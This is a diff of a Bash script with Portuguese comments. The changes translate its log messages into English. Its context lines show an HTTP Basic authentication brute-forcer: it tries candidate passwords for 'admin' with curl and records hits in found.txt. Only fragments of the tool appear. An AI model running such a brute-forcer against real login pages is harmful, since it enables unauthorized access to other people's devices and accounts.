@@ -78,7 +78,7 @@ do
 	#Codificando usuario e senha em Base64
 	code=$( echo -e  "admin:$pass" | base64 )
 	echo "|"
-	echo "[$counter] Senha: $pass, Encode: $code"
+	echo "[$counter] Password: $pass, Encode: $code"
 
 	#Incrementando contador de senhas testadas
 	counter=$(( counter + 1 ))
@@ -96,7 +96,7 @@ do
 		-H "Authorization: Basic $code" |grep -E 'title' )
 
 	#Teste - Descomente abaixo para ver os dados recebidos da conexao
-	#echo "Valor do connect: $connect"
+	#echo "Value of connect: $connect"
 
 	#Teste de validacao de acesso - Simulacao de acesso com sucesso
 	#Retire os dois pontos e as aspas simples (: ') abaixo para descomentar o teste
@@ -114,7 +114,7 @@ do
 	filter=$( echo "$connect" |grep -i required )
 
 	#Teste - Descomente a linha abaixo para ver o resultado obtido
-	#echo "Valor de filter: $filter"
+	#echo "Value of filter: $filter"
 
 	#Analise do resultado
 	if [ -z "$filter" ] #Se a conexao receber codigo 200 (Sucesso)
@@ -122,7 +122,7 @@ do
 		echo ""
 		echo "[+] << Found password >> [+]" |tee -a ./found.txt
 		echo "[+] Encode user:pass = $code [+]" |tee -a ./found.txt
-		echo "[+] User: admin - Password $pass [+]" |tee -a ./found.txt
+		echo "[+] User: admin - Password: $pass [+]" |tee -a ./found.txt
 		echo ""
 		echo "[i] Brute Force successfully completed [i]"
 		echo "[i] Finished [i]"
